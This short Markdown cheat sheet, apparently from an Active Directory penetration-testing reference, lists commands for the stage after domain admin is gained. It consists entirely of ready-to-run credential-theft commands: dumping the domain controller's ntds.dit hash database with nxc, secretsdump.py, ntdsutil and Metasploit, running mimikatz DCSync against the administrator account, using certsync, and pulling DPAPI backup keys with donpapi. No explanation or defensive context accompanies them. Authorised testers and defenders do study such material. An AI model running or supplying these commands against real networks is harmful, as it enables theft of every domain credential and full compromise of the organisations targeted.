# Domain admin

## Dump ntds.dit >>> Lateral move || Crack hash
- `nxc smb <dcip> -u <user> -p <password> -d <domain> --ntds`
- `secretsdump.py '<domain>/<user>:<pass>'@<ip>`
- `ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q`
  - `secretsdump.py -ntds ntds_file.dit -system SYSTEM_FILE -hashes lmhash:nthash LOCAL -outputfile ntlm-extract`
- `msf> windows/gather/credentials/domain_hashdump`
- `mimikatz lsadump::dcsync /domain:<target_domain> /user:<target_domain>\administrator`
- `certsync -u <user> -p '<password>' -d <domain> -dc-ip <dc_ip> -ns <name_server>`

## Grab backup Keys >>> Credentials
- `donpapi collect - H ':<hash>' <domain>/<user>@<ip_range> -t ALL --fetch-pvk`